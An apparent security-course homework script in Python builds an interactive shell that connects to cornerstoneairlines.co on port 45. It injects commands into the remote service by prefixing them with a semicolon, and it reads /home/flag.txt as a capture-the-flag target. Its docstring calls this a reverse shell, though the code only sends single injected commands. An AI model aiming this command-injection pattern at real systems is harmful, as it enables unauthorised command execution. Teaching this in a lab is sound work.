"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
from cmd import Cmd

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here


def execute_cmd(cmd):
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command
    """

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.connect((host, port))
    s.recv(1024)
    s.send((";" + cmd + "\n").encode())
    print(s.recv(1024))


class Shell(Cmd):

    def do_quit(self, args):
        """
        This command quits the interactive shell
        """
        print("Goodbye!\n")
        raise SystemExit

    def do_shell(self, args):
        """
        This command pops a reverse shell for cornerstoneairlines.co.
        """
        execute_cmd("cat /home/flag.txt")

    def do_pull(self, args):
        """
        This command executes a pull request from a remote path to a local path
        How to use
        Pull <remote_path> <local_path>
        """


if __name__ == '__main__':
    prompt = Shell()
    prompt.prompt = '$'
    prompt.cmdloop('Starting interactive shell')

